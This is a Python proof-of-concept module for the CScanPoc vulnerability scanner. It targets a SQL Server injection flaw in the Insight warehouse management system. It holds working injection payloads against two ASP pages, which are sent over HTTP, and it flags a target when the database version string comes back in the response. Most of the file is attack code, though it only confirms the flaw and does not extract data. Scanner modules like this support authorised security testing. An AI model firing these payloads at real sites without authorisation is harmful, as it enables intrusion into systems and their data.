# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '563ba8dd-6c75-41a0-8836-b42029ccd52c'
    name = 'Insight仓储管理系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-01'  # 漏洞公布时间
    desc = '''
        Insight仓储管理系统
        /csccmise/jczp.asp
        /csccmise/jctxx.asp
        SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'Insight(英赛特仓储管理系统)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '5dca332d-7dec-40ee-87bc-2906ccfbe80c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #http://www.wooyun.org/bugs/wooyun-2010-0129390
            #http://www.wooyun.org/bugs/wooyun-2010-0129392
            hh = hackhttp.hackhttp()
            #SQL注入 SQL Server 注入
            arg = self.target
            payloads = [
                #self.target + '/csccmis/jctxx.asp?jcid=1%20and%201=@@version%20--',
                #self.target + '/csccmis/jczp.asp?jcid=1%20or%201=@@version%20--',
                #self.target + '/csccmis/jczpOld.asp?jcid=1%20or%201=@@version%20--',
                arg + '/csccmise/jczp.asp?jcid=1%20or%201=@@version%20--',
                arg + '/csccmise/jctxx.asp?jcid=1%20or%201=@@version%20--',
                #arg + 'csccmissm/jctxx.asp?jcid=1%20or%201=@@version%20--',
                #arg + 'csccmissm/jczp.asp?jcid=1%20or%201=@@version%20--',
                #arg + 'csccmissm/jczpOld.asp?jcid=1%20or%201=@@version%20--',
            ]
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)
                #print res
                if code != 0 and 'Microsoft SQL Server' in res:
                    #security_hole('SQL injection: '+ payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
